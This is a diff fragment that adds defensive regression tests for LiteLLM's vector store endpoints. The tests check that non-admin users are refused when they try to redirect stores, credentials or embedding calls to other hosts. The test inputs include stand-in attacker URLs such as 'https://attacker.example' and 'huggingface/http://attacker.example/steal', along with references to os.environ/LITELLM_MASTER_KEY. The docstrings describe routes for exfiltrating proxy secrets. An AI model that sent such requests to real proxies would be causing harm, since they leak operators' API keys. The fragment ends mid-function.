+    async def test_update_litellm_params_null_clears_a_saved_field_and_falls_back_to_the_environment(self, monkeypatch):
+        """The dashboard sends ``null`` for a field the admin blanked out (see connectionEditPayload.ts).
+        Before this fix that null value round-tripped into the persisted litellm_params, so the store kept
+        pointing at the stale saved api_base instead of clearing it and falling back to the deployment's
+        MONGODB_SIDECAR_API_BASE the way a store that never had a per-store override does."""
+        from litellm.llms.mongodb.vector_stores.transformation import MongoDBVectorStoreConfig
+        from litellm.proxy.vector_store_endpoints.endpoints import (
+            build_request_data_from_managed_vector_store,
+        )
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        monkeypatch.setenv("MONGODB_SIDECAR_API_BASE", "https://deployment-sidecar.example")
+
+        saved = {
+            "mongodb_database": "knowledge",
+            "api_base": "https://stale-per-store-override.example",
+            "api_key": "sk-real-secret",
+        }
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            response = await update_vector_store(
+                data=VectorStoreUpdateRequest(vector_store_id="vs_owned", litellm_params={"api_base": None}),
+                user_api_key_dict=UserAPIKeyAuth(
+                    user_id="owner", team_id="team-A", user_role=LitellmUserRoles.PROXY_ADMIN
+                ),
+            )
+
+        persisted = json.loads(
+            mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"]["litellm_params"]
+        )
+        assert "api_base" not in persisted
+        assert "api_base" not in response["vector_store"]["litellm_params"]
+
+        resolved = build_request_data_from_managed_vector_store(
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs_owned", custom_llm_provider="mongodb", litellm_params=persisted
+            )
+        )
+        assert (
+            MongoDBVectorStoreConfig().get_complete_url(api_base=resolved.get("api_base"), litellm_params=resolved)
+            == "https://deployment-sidecar.example"
+        )
+
+    @pytest.mark.asyncio
+    async def test_update_litellm_params_sentinel_keeps_saved_secret(self):
+        """The dashboard round-trips a redacted secret back on save; that placeholder must not
+        overwrite the real credential the store already has."""
+        from litellm.constants import REDACTED_BY_LITELM_STRING
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        saved = {"mongodb_database": "knowledge", "api_key": "sk-real-secret"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            await update_vector_store(
+                data=VectorStoreUpdateRequest(
+                    vector_store_id="vs_owned",
+                    litellm_params={"api_key": REDACTED_BY_LITELM_STRING, "mongodb_collection": "new_collection"},
+                ),
+                user_api_key_dict=UserAPIKeyAuth(user_id="owner", team_id="team-A"),
+            )
+
+        persisted = json.loads(
+            mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"]["litellm_params"]
+        )
+        assert persisted["api_key"] == "sk-real-secret"
+        assert persisted["mongodb_collection"] == "new_collection"
+
+    @pytest.mark.asyncio
+    async def test_update_litellm_params_persists_os_environ_reference_verbatim(self, monkeypatch):
+        """A proxy admin can point a store's credential at an env var on update as on create. The saved
+        reference must round-trip unresolved and then resolve through the same helper the search path uses,
+        ``build_request_data_from_managed_vector_store``."""
+        from litellm.constants import REDACTED_BY_LITELM_STRING
+        from litellm.proxy.vector_store_endpoints.endpoints import (
+            build_request_data_from_managed_vector_store,
+        )
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        monkeypatch.setenv("SOME_SECRET", "sk-resolved-from-env")
+        monkeypatch.setenv("LITELLM_VECTOR_STORE_ENV_REFERENCE_ALLOWLIST", "mongodb:SOME_SECRET")
+
+        saved = {"mongodb_database": "knowledge", "api_key": "sk-real-secret"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            response = await update_vector_store(
+                data=VectorStoreUpdateRequest(
+                    vector_store_id="vs_owned",
+                    litellm_params={"api_key": "os.environ/SOME_SECRET"},
+                ),
+                user_api_key_dict=UserAPIKeyAuth(
+                    user_id="owner", team_id="team-A", user_role=LitellmUserRoles.PROXY_ADMIN
+                ),
+            )
+
+        persisted = json.loads(
+            mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"]["litellm_params"]
+        )
+        assert persisted["api_key"] == "os.environ/SOME_SECRET"
+        # The response is redacted like every other secret, not resolved and not echoed back in the clear.
+        assert response["vector_store"]["litellm_params"]["api_key"] == REDACTED_BY_LITELM_STRING
+
+        resolved = build_request_data_from_managed_vector_store(
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs_owned", custom_llm_provider="mongodb", litellm_params=persisted
+            )
+        )
+        assert resolved["api_key"] == "sk-resolved-from-env"
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "saved,request_fields",
+        [
+            (
+                {"mongodb_database": "knowledge"},
+                {"litellm_params": {"litellm_embedding_config": {"api_key": "os.environ/LITELLM_MASTER_KEY"}}},
+            ),
+            (
+                {"api_key": "os.environ/MONGODB_SIDECAR_API_KEY"},
+                {"litellm_params": {"api_base": "https://attacker.example"}},
+            ),
+            ({"api_key": "os.environ/OPENAI_API_KEY"}, {"custom_llm_provider": "openai"}),
+        ],
+        ids=["new-nested-reference", "repoint-a-store-holding-a-reference", "reprovider-a-store-holding-a-reference"],
+    )
+    async def test_non_admin_update_cannot_save_or_repoint_an_os_environ_reference(self, saved, request_fields):
+        """Regression: a key with vector store access saved os.environ/LITELLM_MASTER_KEY next to its own
+        api_base, and the next search sent the resolved secret there."""
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+            pytest.raises(HTTPException) as exc_info,
+        ):
+            await update_vector_store(
+                data=VectorStoreUpdateRequest(vector_store_id="vs_owned", **request_fields),
+                user_api_key_dict=UserAPIKeyAuth(
+                    user_id="owner", team_id="team-A", user_role=LitellmUserRoles.INTERNAL_USER
+                ),
+            )
+
+        assert exc_info.value.status_code == 403
+        mock_prisma_client.db.litellm_managedvectorstorestable.update.assert_not_awaited()
+
+    async def _update_as(
+        self,
+        user_role: LitellmUserRoles,
+        saved: dict,
+        request_fields: dict,
+        user_api_key_dict: UserAPIKeyAuth | None = None,
+        **saved_row_fields,
+    ) -> MagicMock:
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        mock_prisma_client = self._mock_prisma_for_update(saved, **saved_row_fields)
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.proxy.proxy_server.llm_router", _embedding_router()),
+            patch("litellm.vector_store_registry", None),
+        ):
+            await update_vector_store(
+                data=VectorStoreUpdateRequest(vector_store_id="vs_owned", **request_fields),
+                user_api_key_dict=user_api_key_dict
+                or UserAPIKeyAuth(user_id="owner", team_id="team-A", user_role=user_role),
+            )
+        return mock_prisma_client
+
+    @staticmethod
+    def _persisted_litellm_params(mock_prisma_client: MagicMock, *keys: str) -> dict:
+        persisted = json.loads(
+            mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"]["litellm_params"]
+        )
+        return {key: persisted.get(key) for key in keys}
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "saved,request_fields,saved_row_fields",
+        [
+            ({"api_key": "sk-saved"}, {"litellm_params": {"api_base": "https://attacker.example"}}, {}),
+            (
+                {"api_key": "sk-saved", "api_base": "https://search.example"},
+                {"litellm_params": {"api_key": "REDACTED_BY_LITELM", "api_base": "https://attacker.example"}},
+                {},
+            ),
+            (
+                {"mongodb_database": "knowledge", "valkey_password": "saved-password"},
+                {"litellm_params": {"base_url": "https://attacker.example"}},
+                {},
+            ),
+            (
+                {"api_key": "sk-saved"},
+                {"custom_llm_provider": "ragflow"},
+                {"custom_llm_provider": "openai"},
+            ),
+            ({}, {"litellm_params": {"api_base": "https://attacker.example"}}, {"litellm_credential_name": "prod"}),
+            (
+                {"litellm_credential_name": "prod"},
+                {"litellm_params": {"litellm_credential_name": "REDACTED_BY_LITELM", "endpoint": "https://a.example"}},
+                {},
+            ),
+            ({}, {"litellm_params": {"api_base": "https://attacker.example"}}, {"custom_llm_provider": "openai"}),
+            (
+                {"api_key": "sk-saved", "api_base": "https://search.example"},
+                {"litellm_params": {"api_key": "sk-mine", "api_base": "https://mine.example"}},
+                {},
+            ),
+            ({"api_base": "https://search.example"}, {"litellm_params": {"api_base": None}}, {}),
+            (
+                {"litellm_embedding_config": {"model": "embed"}},
+                {"litellm_params": {"litellm_embedding_config": {"model": "embed", "api_base": "https://a.example"}}},
+                {},
+            ),
+            ({}, {"custom_llm_provider": "azure_ai"}, {"custom_llm_provider": "openai"}),
+            ({"aws_role_name": "reader"}, {"litellm_params": {"aws_role_name": "admin"}}, {}),
+        ],
+        ids=[
+            "omitted-key",
+            "sentinel-key",
+            "other-sensitive-key",
+            "provider-change",
+            "row-credential-name",
+            "params-credential-name",
+            "env-key-fallback",
+            "new-key",
+            "clear",
+            "nested-embedding-config",
+            "provider-change-without-secret",
+            "aws-role",
+        ],
+    )
+    async def test_non_admin_update_cannot_change_where_a_store_sends_traffic(
+        self, saved, request_fields, saved_row_fields
+    ):
+        """Regression: a key with team access to a store could change its api_base (or provider), and the next
+        search sent the saved api_key, the credential's secret or the proxy's env key for that provider to the new
+        host."""
+        with pytest.raises(HTTPException) as exc_info:
+            await self._update_as(LitellmUserRoles.INTERNAL_USER, saved, request_fields, **saved_row_fields)
+
+        assert exc_info.value.status_code == 403
+        assert "Only proxy admins" in exc_info.value.detail
+
+    @pytest.mark.asyncio
+    async def test_non_admin_update_keeps_a_saved_secret_while_editing_other_fields(self):
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.INTERNAL_USER,
+            {"api_key": "sk-saved", "api_base": "https://search.example", "litellm_credential_name": "prod"},
+            {
+                "litellm_params": {
+                    "api_key": "REDACTED_BY_LITELM",
+                    "litellm_credential_name": "REDACTED_BY_LITELM",
+                    "api_base": "https://search.example",
+                    "mongodb_collection": "docs",
+                }
+            },
+        )
+
+        assert self._persisted_litellm_params(
+            mock_prisma_client, "api_key", "api_base", "litellm_credential_name", "mongodb_collection"
+        ) == {
+            "api_key": "sk-saved",
+            "api_base": "https://search.example",
+            "litellm_credential_name": "prod",
+            "mongodb_collection": "docs",
+        }
+
+    @pytest.mark.asyncio
+    async def test_non_admin_update_can_resend_the_saved_provider(self):
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.INTERNAL_USER,
+            {"api_base": "https://search.example"},
+            {"custom_llm_provider": "openai", "vector_store_description": "docs"},
+            custom_llm_provider="openai",
+        )
+
+        assert mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"] == {
+            "custom_llm_provider": "openai",
+            "vector_store_description": "docs",
+        }
+
+    @pytest.mark.asyncio
+    async def test_admin_update_can_point_a_saved_secret_at_a_new_endpoint(self):
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.PROXY_ADMIN,
+            {"api_key": "sk-saved"},
+            {"litellm_params": {"api_key": "REDACTED_BY_LITELM", "api_base": "https://new-host.example"}},
+            litellm_credential_name="prod",
+        )
+
+        assert self._persisted_litellm_params(mock_prisma_client, "api_key", "api_base") == {
+            "api_key": "sk-saved",
+            "api_base": "https://new-host.example",
+        }
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "saved,litellm_params,named_key",
+        [
+            ({}, {"litellm_credential_name": "prod"}, "litellm_credential_name"),
+            ({"litellm_credential_name": "team"}, {"litellm_credential_name": "prod"}, "litellm_credential_name"),
+            (
+                {},
+                {"litellm_embedding_config": {"litellm_credential_name": "prod", "api_base": "https://a.example"}},
+                "litellm_embedding_config",
+            ),
+        ],
+        ids=["set", "change", "nested"],
+    )
+    async def test_non_admin_update_cannot_set_a_credential_name(self, saved, litellm_params, named_key):
+        """Regression: a store's litellm_credential_name merges that proxy credential's secrets into every
+        search, so naming one next to your own api_base sent the credential to your host."""
+        with pytest.raises(HTTPException) as exc_info:
+            await self._update_as(LitellmUserRoles.INTERNAL_USER, saved, {"litellm_params": litellm_params})
+
+        assert exc_info.value.status_code == 403
+        assert named_key in exc_info.value.detail
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("litellm_params", _KEYS_OUTSIDE_THE_NON_ADMIN_ALLOWLIST, ids=_first_key)
+    async def test_non_admin_update_cannot_set_params_outside_the_allowlist(self, litellm_params):
+        with pytest.raises(HTTPException) as exc_info:
+            await self._update_as(
+                LitellmUserRoles.INTERNAL_USER, {"mongodb_database": "kb"}, {"litellm_params": litellm_params}
+            )
+
+        assert exc_info.value.status_code == 403
+        assert next(iter(litellm_params)) in exc_info.value.detail
+
+    @pytest.mark.asyncio
+    async def test_non_admin_update_can_repoint_a_company_handbook_store_at_new_data(self):
+        saved = {
+            "api_base": "http://127.0.0.1:8080",
+            "api_key": "os.environ/MONGODB_SIDECAR_API_KEY",
+            "mongodb_database": "knowledge",
+            "mongodb_collection": "company_handbook",
+            "litellm_embedding_model": "text-embedding-3-small",
+        }
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.INTERNAL_USER,
+            saved,
+            {
+                "litellm_params": {
+                    "api_key": "REDACTED_BY_LITELM",
+                    "mongodb_collection": "company_handbook_v2",
+                    "litellm_embedding_model": "text-embedding-3-large",
+                }
+            },
+        )
+
+        assert self._persisted_litellm_params(mock_prisma_client, *saved) == {
+            **saved,
+            "mongodb_collection": "company_handbook_v2",
+            "litellm_embedding_model": "text-embedding-3-large",
+        }
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "user_api_key_dict,status_code",
+        [
+            (UserAPIKeyAuth(user_id="owner", team_id="team-A", user_role=LitellmUserRoles.INTERNAL_USER), 400),
+            (UserAPIKeyAuth(user_id="owner", user_role=LitellmUserRoles.INTERNAL_USER, models=["gpt-4o"]), 403),
+        ],
+        ids=["unserved-model", "model-not-allowed-for-key"],
+    )
+    async def test_non_admin_update_cannot_repoint_the_embedding_model_at_a_model_it_may_not_use(
+        self, user_api_key_dict, status_code
+    ):
+        new_model = _ATTACKER_EMBEDDING_MODEL if status_code == 400 else "text-embedding-3-large"
+        with pytest.raises(HTTPException) as exc_info:
+            await self._update_as(
+                LitellmUserRoles.INTERNAL_USER,
+                {"mongodb_collection": "company_handbook", "litellm_embedding_model": "text-embedding-3-small"},
+                {"litellm_params": {"litellm_embedding_model": new_model}},
+                user_api_key_dict=user_api_key_dict,
+            )
+
+        assert exc_info.value.status_code == status_code
+
+    @pytest.mark.asyncio
+    async def test_non_admin_update_keeps_an_embedding_model_an_admin_saved(self):
+        saved = {"mongodb_collection": "company_handbook", "litellm_embedding_model": "admin-only-embedding"}
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.INTERNAL_USER, saved, {"litellm_params": {"mongodb_collection": "company_handbook_v2"}}
+        )
+
+        assert self._persisted_litellm_params(mock_prisma_client, *saved) == {
+            **saved,
+            "mongodb_collection": "company_handbook_v2",
+        }
+
+    @pytest.mark.asyncio
+    async def test_admin_update_can_set_a_credential_name(self):
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.PROXY_ADMIN, {}, {"litellm_params": {"litellm_credential_name": "prod"}}
+        )
+
+        assert self._persisted_litellm_params(mock_prisma_client, "litellm_credential_name") == {
+            "litellm_credential_name": "prod"
+        }
+
+    @pytest.mark.asyncio
+    async def test_update_litellm_params_rejects_misspelled_redaction_sentinel(self):
+        """A fat-fingered sentinel (double L, wrong case, ...) is not the redaction placeholder and is not a
+        real credential either; persisting it verbatim would silently clobber the saved api_key with garbage.
+        Reject it instead of storing it."""
+        from litellm.constants import REDACTED_BY_LITELM_STRING
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        saved = {"mongodb_database": "knowledge", "api_key": "sk-real-secret"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            with pytest.raises(HTTPException) as exc_info:
+                await update_vector_store(
+                    data=VectorStoreUpdateRequest(
+                        vector_store_id="vs_owned",
+                        litellm_params={"api_key": "REDACTED_BY_LITELLM"},
+                    ),
+                    user_api_key_dict=UserAPIKeyAuth(user_id="owner", team_id="team-A"),
+                )
+
+        assert exc_info.value.status_code == 400
+        assert REDACTED_BY_LITELM_STRING in str(exc_info.value.detail)
+        mock_prisma_client.db.litellm_managedvectorstorestable.update.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_update_litellm_params_rejects_misspelled_redaction_sentinel_on_any_masked_key(self):
+        """The guard used to check only api_key; every key the litellm_params masker treats as sensitive
+        (for example valkey_password) must get the same protection, or a fat-fingered sentinel on that
+        field would silently overwrite the real saved secret instead of being rejected."""
+        from litellm.constants import REDACTED_BY_LITELM_STRING
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        saved = {"valkey_host": "localhost", "valkey_password": "the-real-password"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            with pytest.raises(HTTPException) as exc_info:
+                await update_vector_store(
+                    data=VectorStoreUpdateRequest(
+                        vector_store_id="vs_owned",
+                        litellm_params={"valkey_password": "REDACTED_BY_LITELLM"},
+                    ),
+                    user_api_key_dict=UserAPIKeyAuth(user_id="owner", team_id="team-A"),
+                )
+
+        assert exc_info.value.status_code == 400
+        assert "valkey_password" in str(exc_info.value.detail)
+        assert REDACTED_BY_LITELM_STRING in str(exc_info.value.detail)
+        mock_prisma_client.db.litellm_managedvectorstorestable.update.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_update_litellm_params_accepts_exact_redaction_sentinel(self):
+        """The exact sentinel constant must still take the "keep the saved secret" branch rather than tripping
+        the new misspelling guard, which only rejects strings that are *not* an exact match."""
+        from litellm.constants import REDACTED_BY_LITELM_STRING
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        saved = {"mongodb_database": "knowledge", "api_key": "sk-real-secret"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            await update_vector_store(
+                data=VectorStoreUpdateRequest(
+                    vector_store_id="vs_owned",
+                    litellm_params={"api_key": REDACTED_BY_LITELM_STRING, "mongodb_collection": "new_collection"},
+                ),
+                user_api_key_dict=UserAPIKeyAuth(user_id="owner", team_id="team-A"),
+            )
+
+        persisted = json.loads(
+            mock_prisma_client.db.litellm_managedvectorstorestable.update.call_args.kwargs["data"]["litellm_params"]
+        )
+        assert persisted["api_key"] == "sk-real-secret"
+        assert persisted["mongodb_collection"] == "new_collection"
+
+    @pytest.mark.asyncio
+    async def test_update_response_redacts_merged_litellm_params(self):
+        """The response must reflect the merged params, not just the request body, with secrets redacted."""
+        from litellm.constants import REDACTED_BY_LITELM_STRING
+        from litellm.proxy.vector_store_endpoints.management_endpoints import update_vector_store
+        from litellm.types.vector_stores import VectorStoreUpdateRequest
+
+        saved = {"mongodb_database": "knowledge", "api_key": "sk-real-secret"}
+        mock_prisma_client = self._mock_prisma_for_update(saved)
+
+        with (
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints.check_feature_access_for_user",
+                new_callable=AsyncMock,
+            ),
+            patch(
+                "litellm.proxy.vector_store_endpoints.management_endpoints._check_vector_store_access",
+                new_callable=AsyncMock,
+                return_value=True,
+            ),
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma_client),
+            patch("litellm.vector_store_registry", None),
+        ):
+            response = await update_vector_store(
+                data=VectorStoreUpdateRequest(
+                    vector_store_id="vs_owned", litellm_params={"mongodb_collection": "new_collection"}
+                ),
+                user_api_key_dict=UserAPIKeyAuth(user_id="owner", team_id="team-A"),
+            )
+
+        params = response["vector_store"]["litellm_params"]
+        assert params["api_key"] == REDACTED_BY_LITELM_STRING
+        assert params["mongodb_collection"] == "new_collection"
 
 
 class TestAzureAIDocumentWritePassthroughPermission:
@@ -3061,3 +4201,360 @@ def test_vector_store_search_rejects_caller_embedding_selection_params(blocked_k
 
     assert response.status_code == 400, response.json()
     assert blocked_key in str(response.json())
+
+
+@pytest.mark.parametrize(
+    "endpoint_key",
+    [
+        "aws_region_name",
+        "vertex_location",
+        "valkey_host",
+        "endpoint",
+        "vertex_credentials",
+        "azure_ad_token",
+        "azure_scope",
+        "s3_endpoint_url",
+    ],
+)
+def test_vector_store_search_rejects_endpoint_params_from_non_admins(endpoint_key):
+    """Regression: a search body could pick the region or host of a store the proxy's own env credentials sign for
+    (s3_vectors builds its host from aws_region_name), sending the proxy's credentials to the caller's host."""
+    from fastapi.testclient import TestClient
+
+    from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
+    from litellm.proxy.proxy_server import app
+
+    mock_auth = UserAPIKeyAuth(user_id="test_internal_user", user_role=LitellmUserRoles.INTERNAL_USER.value)
+    original_overrides = app.dependency_overrides.copy()
+    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
+    try:
+        response = TestClient(app).post(
+            "/v1/vector_stores/s3-store/search",
+            json={"query": "hello", endpoint_key: "attacker.example/"},
+        )
+    finally:
+        app.dependency_overrides = original_overrides
+
+    assert response.status_code == 403, response.json()
+    assert endpoint_key in str(response.json())
+
+
+@pytest.mark.parametrize(
+    "request_key",
+    [
+        "vertex_credentials",
+        "vertex_ai_credentials",
+        "azure_ad_token",
+        "azure_scope",
+        "aws_session_tags",
+        "aws_bedrock_project_id",
+        "s3_endpoint_url",
+        "sagemaker_base_url",
+        "deployment_url",
+    ],
+)
+def test_managed_store_search_data_never_takes_a_credential_or_endpoint_from_the_request(request_key):
+    """Regression: a managed store only pinned its host keys, so a request could still hand its search a
+    vertex_credentials workload identity config that makes google-auth post a local file to the caller's host."""
+    from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    store = LiteLLM_ManagedVectorStore(
+        vector_store_id="vs-vertex", custom_llm_provider="vertex_ai", litellm_params={"vertex_project": "p"}
+    )
+
+    search_data = {request_key: "attacker-choice", **build_request_data_from_managed_vector_store(store)}
+
+    assert search_data[request_key] is None
+
+
+@pytest.mark.parametrize("path", ["/v1/vector_stores", "/v1/vector_stores/vs-unmanaged"], ids=["create", "update"])
+@pytest.mark.parametrize(
+    "param,value", [("vertex_location", "attacker"), ("litellm_credential_name", "openai-prod")]
+)
+def test_vector_store_create_and_update_reject_endpoint_params_from_non_admins(path, param, value):
+    """Regression: only search checked its body, so a create or update body could still pick the region or host
+    that the proxy's own provider credentials are sent to."""
+    from fastapi.testclient import TestClient
+
+    from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
+    from litellm.proxy.proxy_server import app
+
+    mock_auth = UserAPIKeyAuth(user_id="test_internal_user", user_role=LitellmUserRoles.INTERNAL_USER.value)
+    original_overrides = app.dependency_overrides.copy()
+    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
+    try:
+        response = TestClient(app).post(path, json={"name": "kb", "custom_llm_provider": "vertex_ai", param: value})
+    finally:
+        app.dependency_overrides = original_overrides
+
+    assert response.status_code == 403, response.json()
+    assert param in str(response.json())
+
+
+def test_vector_store_create_rejects_litellm_embedding_config_from_non_admins():
+    """Regression (mongodb create-path key leak): only litellm_embedding_model was gated on create, so a
+    non-admin's litellm_embedding_config.api_base could still redirect the dimension probe's embedding
+    call to an attacker host with the proxy's own provider key."""
+    from fastapi.testclient import TestClient
+
+    from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
+    from litellm.proxy.proxy_server import app
+
+    mock_auth = UserAPIKeyAuth(user_id="test_internal_user", user_role=LitellmUserRoles.INTERNAL_USER.value)
+    original_overrides = app.dependency_overrides.copy()
+    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
+    try:
+        response = TestClient(app).post(
+            "/v1/vector_stores",
+            json={
+                "name": "kb",
+                "custom_llm_provider": "mongodb",
+                "litellm_embedding_model": "openai/text-embedding-3-small",
+                "litellm_embedding_config": {"api_base": "https://attacker.example/v1"},
+                "mongodb_database": "d",
+                "mongodb_collection": "c",
+            },
+        )
+    finally:
+        app.dependency_overrides = original_overrides
+
+    assert response.status_code == 403, response.json()
+    assert "litellm_embedding_config" in str(response.json())
+
+
+def test_vector_store_create_rejects_an_embedding_model_the_router_does_not_serve():
+    """Regression (LIT-6750 follow-up / mongodb create-path key leak): the create path never checked its
+    embedding model against the router or the caller's key, so a non-admin's huggingface/<attacker host>
+    reached that host with the proxy's HUGGINGFACE_API_KEY during the dimension probe."""
+    from fastapi.testclient import TestClient
+
+    from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
+    from litellm.proxy.proxy_server import app
+
+    mock_auth = UserAPIKeyAuth(user_id="test_internal_user", user_role=LitellmUserRoles.INTERNAL_USER.value)
+    original_overrides = app.dependency_overrides.copy()
+    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
+    try:
+        with patch("litellm.proxy.proxy_server.llm_router", _embedding_router()):
+            response = TestClient(app).post(
+                "/v1/vector_stores",
+                json={
+                    "name": "kb",
+                    "custom_llm_provider": "mongodb",
+                    "litellm_embedding_model": "huggingface/http://attacker.example/steal",
+                    "mongodb_database": "d",
+                    "mongodb_collection": "c",
+                },
+            )
+    finally:
+        app.dependency_overrides = original_overrides
+
+    assert response.status_code == 400, response.json()
+    assert "huggingface/http://attacker.example/steal" in str(response.json())
+
+
+def test_request_endpoint_check_ignores_filters_and_admins():
+    from litellm.proxy.vector_store_endpoints.utils import assert_proxy_admin_for_request_endpoints
+
+    assert_proxy_admin_for_request_endpoints(
+        {"query": "q", "filters": {"endpoint": "/v1/chat"}},
+        UserAPIKeyAuth(user_role=LitellmUserRoles.INTERNAL_USER),
+    )
+    assert_proxy_admin_for_request_endpoints(
+        {"query": "q", "aws_region_name": "eu-west-1", "litellm_credential_name": "prod"},
+        UserAPIKeyAuth(user_role=LitellmUserRoles.PROXY_ADMIN),
+    )
+
+
+def test_build_request_data_from_managed_vector_store_never_resolves_a_saved_proxy_secret(monkeypatch):
+    """Regression: any key with vector store access could save api_key os.environ/LITELLM_MASTER_KEY next to its
+    own api_base, and the next search sent the resolved master key to that host."""
+    from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    monkeypatch.setenv("LITELLM_MASTER_KEY", "sk-master")
+    monkeypatch.delenv("LITELLM_VECTOR_STORE_ENV_REFERENCE_ALLOWLIST", raising=False)
+    for provider in ("openai", "mongodb"):
